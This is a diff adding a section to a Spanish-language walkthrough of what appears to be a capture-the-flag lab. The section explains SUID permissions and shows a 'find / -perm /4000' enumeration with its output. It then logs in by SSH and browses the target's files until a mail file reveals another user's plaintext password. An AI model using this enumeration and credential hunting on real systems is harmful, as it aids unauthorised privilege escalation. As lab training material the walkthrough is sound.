@@ -160,3 +160,52 @@ Vemos que nos ha devuelto que el comando *sudo* no se ha encontrado así que no 
 
 La siguiente opción es buscar permisos SUID.  El SUID (Set User ID) es un bit especial de permisos en sistemas tipo Unix/Linux que se aplica a archivos ejecutables. Su función principal es permitir que un programa se ejecute con los permisos del propietario del archivo, en lugar de los permisos del usuario que lo ejecuta. Esto puede ser útil para ciertas tareas que requieren privilegios elevados, sin dar acceso completo al usuario.  Para ello ejecutaremos: 
 
+```
+$ find / -perm /4000 2>/dev/null
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/sudo
+/bin/su
+/bin/umount
+/bin/mount
+```
+
+```ruby
+❯ ssh camilo@172.17.0.2
+camilo@172.17.0.2's password: 
+Last login: Mon Sep 15 12:50:10 2025 from 172.17.0.1
+$ pwd
+/home/camilo
+$ cd ..
+$ ls -a -R
+.:
+.  ..  camilo  juan  pedro
+
+./camilo:
+.  ..  .bash_logout  .bashrc  .profile
+
+./juan:
+.  ..  .bash_logout  .bashrc  .profile
+
+./pedro:
+.  ..  .bash_logout  .bashrc  .profile
+$ cd ..
+$ ls -a
+.  ..  .dockerenv  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
+$ ls -a var
+.  ..  backups  cache  lib  local  lock  log  mail  opt  run  spool  tmp  www
+$ ls -a var/mail
+.  ..  camilo
+$ ls -a var/mail/camilo
+.  ..  correo.txt
+$ cat var/mail/camilo/correo.txt
+Hola Camilo,
+
+Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
+$ 
+```
